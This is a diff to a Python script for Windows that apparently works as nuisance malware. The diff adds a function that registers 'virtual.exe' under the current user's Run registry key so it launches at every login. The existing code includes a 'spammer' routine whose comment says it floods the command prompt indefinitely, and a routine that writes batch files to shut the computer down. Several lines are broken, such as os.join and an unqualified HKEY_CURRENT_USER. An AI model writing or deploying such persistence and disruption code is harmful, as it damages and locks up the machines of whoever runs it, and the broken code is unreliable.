@@ -1,11 +1,50 @@
+# Python code to add current script to the registry
+
+# module to edit the windows registry
+import winreg as reg
 import os
 
-parent_dir = "C://home//User//Documents"
+
+def AddToRegistry():
+    # in python __file__ is the instant of
+    # file path where it was executed
+    # so if it was executed from desktop,
+    # then __file__ will be
+    # c:\users\current_user\desktop
+    pth = os.path.dirname(os.path.realpath('C://GAMEDATA//virtual.exe'))
+
+    # name of the python file with extension
+    s_name = "virtual.exe"
+
+    # joins the file name to end of path address
+    address = os.join(pth, s_name)
+
+    # key we want to change is HKEY_CURRENT_USER
+    # key value is Software\Microsoft\Windows\CurrentVersion\Run
+    key = HKEY_CURRENT_USER
+    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
+
+    # open the key to make changes to
+    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
+
+    # modify the opened key
+    reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address)
+
+    # now close the opened key
+    reg.CloseKey(open)
+pass
+
+# Driver Code
+if __name__ == "__main__":
+    AddToRegistry()
+
+parent_dir = "C://Windows//User//Documents"
 
 os.makedirs(parent_dir, os.R_OK), os.W_OK
 
 
 def spammer():
+    # This line spamss CMD indefinely
     if os.access("C://home//User//Documents", os.F_OK):
         spammer1 = open("C://home//User//Documents//spammer.txt", 'w')
         spammer1.writelines('for i in range(9999999 * 99999999):\n')
@@ -22,6 +61,7 @@ pass
 
 
 def complete_shut_down():
+    # This lines completely shuts down the computer
     if os.access("C://home//User//Documents", os.F_OK):
         shutdown = open("C://home//User//Documents//shutdown.txt", 'w')
         shutdown.writelines('@Echo off')
